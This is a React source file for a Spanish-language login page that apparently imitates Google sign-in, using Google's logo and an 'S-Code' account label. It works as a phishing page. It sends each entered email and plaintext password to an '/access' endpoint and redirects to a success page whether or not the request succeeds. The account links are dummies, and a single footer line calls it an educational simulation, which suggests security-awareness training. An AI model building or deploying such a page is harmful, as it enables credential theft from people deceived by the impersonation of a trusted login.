import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import api from '../api/axios';
import {
  LoginWrapper,
  LoginCard,
  LogoContainer,
  Title,
  Subtitle,
  InputGroup,
  InputLabel,
  Input,
  ErrorMessage,
  ForgotLink,
  ButtonRow,
  CreateAccountLink,
  SubmitButton,
  InfoText,
  PasswordToggle,
} from '../styles/LoginStyles';

function LoginPage() {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const validateEmail = (val) => {
    if (!val) return 'Ingresá tu correo electrónico';
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) return 'Ingresá un correo electrónico válido';
    return '';
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const error = validateEmail(email);
    if (error) {
      setEmailError(error);
      return;
    }
    if (!password) {
      setPasswordError('Ingresá tu contraseña');
      return;
    }

    setSubmitting(true);
    try {
      await api.post('/access', { email, password });
      navigate('/success');
    } catch (err) {
      console.error('Error registrando acceso:', err);
      navigate('/success');
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <LoginWrapper>
      <LoginCard>
        <LogoContainer>
          <svg viewBox="0 0 48 48" style={{ width: '72px', height: 'auto' }}>
            <path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.5 2.37-2 4.37-4.27 5.71l6.94 5.29c4.07-3.72 6.61-9.22 6.61-16.01z"/>
            <path fill="#34A853" d="M24 46.5c6.48 0 11.9-2.12 15.87-5.79l-6.94-5.29c-2.1 1.45-4.93 2.3-8.93 2.3-6.84 0-12.64-4.58-14.71-10.77l-6.99 5.48C7.51 40.38 15.29 46.5 24 46.5z"/>
            <path fill="#FBBC05" d="M9.29 27.46c-1.0-2.99-1.0-6.16 0-9.15L2.3 12.83C-.1 17.64-.1 23.33 2.3 28.14l6.99-5.48z"/>
            <path fill="#EA4335" d="M24 9.87c3.52 0 6.68 1.21 9.16 3.58l6.86-6.89C35.89 2.31 30.49 0 24 0 15.29 0 7.51 5.99 3.3 14.88l7.99 5.72c2.07-6.19 7.87-10.73 14.71-10.73z"/>
          </svg>
        </LogoContainer>

        <Title>Iniciar sesión</Title>
        <Subtitle>Continuá con tu cuenta de S-Code</Subtitle>

        <form onSubmit={handleSubmit} noValidate>
          <InputGroup>
            <Input
              id="email-input"
              type="email"
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                if (emailError) setEmailError('');
              }}
              onFocus={() => setEmailFocused(true)}
              onBlur={() => setEmailFocused(false)}
              $hasError={!!emailError}
              autoComplete="email"
              autoFocus
            />
            <InputLabel
              htmlFor="email-input"
              $hasValue={!!email}
              $isFocused={emailFocused}
              $hasError={!!emailError}
            >
              Correo electrónico
            </InputLabel>
            <ErrorMessage>{emailError}</ErrorMessage>
          </InputGroup>

          <InputGroup>
            <Input
              id="password-input"
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => {
                  setPassword(e.target.value);
                  if (passwordError) setPasswordError('');
                }}
              onFocus={() => setPasswordFocused(true)}
              onBlur={() => setPasswordFocused(false)}
              $hasError={!!passwordError}
              autoComplete="current-password"
            />
            <InputLabel
              htmlFor="password-input"
              $hasValue={!!password}
              $isFocused={passwordFocused}
              $hasError={!!passwordError}
            >
              Contraseña
            </InputLabel>
            <PasswordToggle
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              tabIndex={-1}
              aria-label={showPassword ? 'Ocultar contraseña' : 'Mostrar contraseña'}
            >
              {showPassword ? (
                <svg viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
                </svg>
              ) : (
                <svg viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                </svg>
              )}
            </PasswordToggle>
            <ErrorMessage>{passwordError}</ErrorMessage>
          </InputGroup>

          <ForgotLink>
            <a href="#" onClick={(e) => e.preventDefault()}>¿Olvidaste tu contraseña?</a>
          </ForgotLink>

          <ButtonRow>
            <CreateAccountLink href="#" onClick={(e) => e.preventDefault()}>
              Crear cuenta
            </CreateAccountLink>
            <SubmitButton
              id="submit-button"
              type="submit"
              disabled={submitting}
            >
              {submitting ? 'Ingresando...' : 'Siguiente'}
            </SubmitButton>
          </ButtonRow>
        </form>

        <InfoText>
          Este es un entorno de simulación educativa.{' '}
          <a href="#" onClick={(e) => e.preventDefault()}>Más información</a>
        </InfoText>
      </LoginCard>
    </LoginWrapper>
  );
}

export default LoginPage;
